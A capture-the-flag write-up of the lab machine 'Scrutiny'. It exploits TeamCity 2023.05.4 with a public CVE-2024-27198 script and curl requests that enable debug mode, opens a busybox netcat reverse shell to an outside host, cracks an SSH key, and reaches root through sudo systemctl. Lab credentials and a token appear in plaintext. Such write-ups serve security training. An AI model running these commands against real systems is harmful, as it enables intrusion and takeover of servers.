---
icon: ubuntu
---

# Scrutiny - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.224.91 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 20:18 EDT
Nmap scan report for 192.168.224.91
Host is up (0.030s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
25/tcp  open   smtp    Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=onlyrands.com
| Subject Alternative Name: DNS:onlyrands.com
| Not valid before: 2024-06-07T09:33:24
|_Not valid after:  2034-06-05T09:33:24
|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-title: OnlyRands
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp closed https
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   27.71 ms 192.168.45.1
2   28.42 ms 192.168.45.254
3   30.05 ms 192.168.251.1
4   30.22 ms 192.168.224.91
```

nmap scan reveals DNS name I am going to update the /etc/hosts file

```
192.168.224.91	onlyrands.com
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>

At the bottom of the page there is a login button, if we click it we are redirected to the following page, revealing a new subdomain name

<figure><img src="../../.gitbook/assets/image (699).png" alt=""><figcaption></figcaption></figure>

I'll update my hosts file

```
192.168.224.91	onlyrands.com teams.onlyrands.com
```

<figure><img src="../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>

We got a version at the bottom of the login form

Searchsploit instantly reveals an RCE payload let's check it out

<figure><img src="../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**A lot of exploits did not worked**</mark>

### <mark style="color:$primary;">Team City 2023.05.4 RCE</mark>

I did found an exploit that worked on github [**link**](https://github.com/Stuub/RCity-CVE-2024-27198.git)

```
git clone https://github.com/Stuub/RCity-CVE-2024-27198.git
```

I had to add the -c argument for the shell not to exit automatically

```
python3 RCity.py -t http://teams.onlyrands.com/ --no-enum -c id
```

<figure><img src="../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

Ok new error.

Turns out we need to enable debug mode. We will do this via a POST request with curl. In order to do this, we first need to get an an admin token using our admin cred. Look back through the exploit you just ran, and get those admin creds

<figure><img src="../../.gitbook/assets/image (703).png" alt=""><figcaption></figcaption></figure>

```
curl -X POST http://teams.onlyrands.com/app/rest/users/id:21/tokens/RPC2 -u RCity_Rules_356:QIQqJMRs
```

<figure><img src="../../.gitbook/assets/image (704).png" alt=""><figcaption></figcaption></figure>

make sure to update the red marks for it to work

Now take that token from the “value” field, then export to the TOKEN environment variable.

```
export TOKEN=eyJ0eXAiOiAiVENWMiJ9.VVo3eXJBMHVEM0ZrOW41azhfT2s4TloyamFR.YzA0NWUzNDItZjg5NC00NDJjLTkxNWMtZjU1NmYxNzM1NWZk
```

Now to enable debug mode

```
curl -X POST 'http://teams.onlyrands.com/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H "Authorization: Bearer $TOKEN"
```

<figure><img src="../../.gitbook/assets/image (705).png" alt=""><figcaption></figcaption></figure>

Then refresh:

```
curl 'http://teams.onlyrands.com/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties' -H "Authorization: Bearer $TOKEN"
```

<figure><img src="../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>

Now run  python3 RCity.py -t [http://teams.onlyrands.com/](http://teams.onlyrands.com/) -c id again, now that <mark style="color:yellow;">**debug mode is enabled**</mark>.

```
python3 RCity.py -t http://teams.onlyrands.com/ -c id
```

<figure><img src="../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>

Now let's get a reverse shell

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (709).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>

Found a bunch of git repos in git's home directory freelancers folder

<figure><img src="../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Git Repo Credential Exposure</mark>

I'll use [**penelope**](https://github.com/brightio/penelope) to get a better shell

<figure><img src="../../.gitbook/assets/image (712).png" alt=""><figcaption></figcaption></figure>

This is so much better, let's checkout the repo again

<figure><img src="../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

There is an Oops we like that, let's check it out!

<figure><img src="../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

There is an ssh key here, it might be marcot's key let's copy and try to ssh with it

Make sure to remove the extra dashes \[-] from the key

```
vi marcot_id_rsa
chmod 600 marcot_id_rsa
```

<figure><img src="../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

It's password protected here comes ssh2john

<figure><img src="../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

john managed to crack it&#x20;

```
ssh -i marcot_id_rsa marcot@192.168.224.91
```

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Mail Credential Exposure</mark>

Now we can read some of these files in /var/www/mail

<mark style="color:yellow;">**Note!**</mark> If you see port 25 or SMTP on the target, always look through /var/mail/ and /var/spool/mail

<figure><img src="../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

We found another password.

It’s important to read the email. Matthew’s not just giving away his password, he’s saying that he left Marco something on his \[Matthew’s] account. Also, who’s Dach? With some basic enumeration \[/etc/passwd], you can see that Dach corresponds to briand’s account.

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

So we can use that password to log in as Matthewa

```
matthewa:IdealismEngineAshen476
```

<figure><img src="../../.gitbook/assets/image (722).png" alt=""><figcaption></figcaption></figure>

After enumerating for a while. I realized that matthew probably hid the secret for marco in his home directory.

<figure><img src="../../.gitbook/assets/image (723).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

```
RefriedScabbedWasting502
```

Another account we can su in, let's check it out

<figure><img src="../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (726).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (727).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SUDO systemctl</mark>

[**Gtfobins**](https://gtfobins.github.io/gtfobins/systemctl/#sudo) has an easy prevesc for this

<figure><img src="../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

```
sudo /usr/bin/systemctl status teamcity-server.service
```

<figure><img src="../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>

And we got root! For some reason this box felt long. Probably the wild goose chase of massive Credential Leakage&#x20;
